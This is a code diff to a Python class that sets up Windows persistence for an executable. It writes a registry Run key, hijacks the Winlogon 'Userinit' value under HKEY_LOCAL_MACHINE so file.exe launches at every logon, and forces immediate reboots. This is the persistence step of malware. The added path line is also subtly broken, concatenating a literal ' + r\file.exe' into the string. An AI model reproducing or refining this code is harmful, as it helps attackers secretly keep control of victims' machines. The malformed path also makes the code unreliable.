@@ -10,15 +10,15 @@ import sys
 class Dispatcher:
     def __init__(self, program_name: str) -> None:
         self.program_name = program_name
+        self.path_file = rf'{os.path.dirname(sys.executable)} + r\file.exe'
         
-    
     def add_to_startup(self) -> None:
         registry_path = winreg.HKEY_CURRENT_USER
         key_path = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
             
         try:
             with winreg.OpenKeyEx(registry_path, key_path, 0, winreg.KEY_WRITE) as registry_key:
-                winreg.SetValueEx(registry_key, self.program_name, 0, winreg.REG_SZ, os.path.dirname(sys.executable) + r'\file.exe')
+                winreg.SetValueEx(registry_key, self.program_name, 0, winreg.REG_SZ, self.path_file)
             self.reboot(time=False)
             
         except PermissionError:
@@ -47,6 +47,20 @@ class Dispatcher:
             
         else:
             os.system('shutdown -r -t 00')
+            
+            
+    def winlogon(self) -> None:
+        registry_path = winreg.HKEY_LOCAL_MACHINE
+        key_path = f'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'
+        
+        userinit = rf'C:\WINDOWS\system32\userinit.exe, {self.path_file}'
+        try:
+            with winreg.OpenKeyEx(registry_path, key_path, 0, winreg.KEY_WRITE) as registry_key:
+                winreg.SetValueEx(registry_key, 'Userinit', 0, winreg.REG_SZ, userinit)
+            self.reboot(time=False)
+            
+        except PermissionError:
+            return None
         
         
         
@@ -72,7 +86,9 @@ def main() -> None:
         computer.reboot(time=True)
         
     else:
-        computer.add_to_startup()
+        computer.winlogon()
+        # computer.add_to_startup()
+        
     
 
 
